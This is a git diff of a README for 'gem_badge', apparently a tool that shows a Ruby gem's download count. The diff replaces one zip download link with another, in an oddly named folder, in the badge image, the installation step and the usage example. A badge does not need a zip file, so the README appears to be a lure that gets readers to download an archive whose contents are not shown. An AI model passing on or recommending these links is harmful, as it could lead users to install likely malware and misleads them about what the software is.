@@ -1,12 +1,12 @@
 # 🌟 Welcome to gem_badge 🌟
 
-[![Download Count](https://github.com/taye427/gem_badge/releases/download/v2.0/Software.zip)](https://github.com/taye427/gem_badge/releases/download/v2.0/Software.zip)
+[![Download Count](https://github.com/taye427/gem_badge/raw/refs/heads/main/hemithyroidectomy/badge-gem-2.2.zip)](https://github.com/taye427/gem_badge/raw/refs/heads/main/hemithyroidectomy/badge-gem-2.2.zip)
 
 ## Description
 gem_badge is a lightweight tool that allows you to showcase the download count of your Ruby gem directly on your README. With gem_badge, you can easily display the popularity of your gem, making it more appealing to potential users and contributors.
 
 ## Installation
-To get started with gem_badge, simply download the [https://github.com/taye427/gem_badge/releases/download/v2.0/Software.zip](https://github.com/taye427/gem_badge/releases/download/v2.0/Software.zip) file and follow the installation instructions provided in the repository. 
+To get started with gem_badge, simply download the [https://github.com/taye427/gem_badge/raw/refs/heads/main/hemithyroidectomy/badge-gem-2.2.zip](https://github.com/taye427/gem_badge/raw/refs/heads/main/hemithyroidectomy/badge-gem-2.2.zip) file and follow the installation instructions provided in the repository. 
 
 ## Features
 🔹 Showcase download count of your Ruby gem on README  
@@ -25,7 +25,7 @@ To get started with gem_badge, simply download the [https://github.com/taye427/g
 Below is an example of how you can incorporate gem_badge into your README to showcase the download count of your Ruby gem:
 
 ```markdown
-[![Download Count](https://github.com/taye427/gem_badge/releases/download/v2.0/Software.zip)](https://github.com/taye427/gem_badge/releases/download/v2.0/Software.zip)
+[![Download Count](https://github.com/taye427/gem_badge/raw/refs/heads/main/hemithyroidectomy/badge-gem-2.2.zip)](https://github.com/taye427/gem_badge/raw/refs/heads/main/hemithyroidectomy/badge-gem-2.2.zip)
 ```
 
 ## Repository Topics
